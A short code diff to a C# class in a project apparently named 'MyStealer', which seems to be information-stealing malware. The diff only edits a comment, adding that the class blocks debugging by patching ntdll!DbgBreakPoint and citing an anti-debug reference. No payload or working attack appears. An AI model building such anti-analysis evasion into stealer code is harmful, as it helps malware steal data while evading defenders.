@@ -4,7 +4,8 @@ using static MyStealer.AntiDebug.NativeCalls;
 namespace MyStealer.AntiDebug.Prevention
 {
     /// <summary>
-    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
+    /// Prevent from being debugged by patching <c>ntdll!DbgBreakPoint</c>
+    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs#L150
     /// </summary>
     public class AntiDbgBreakPoint : CheckBase
     {
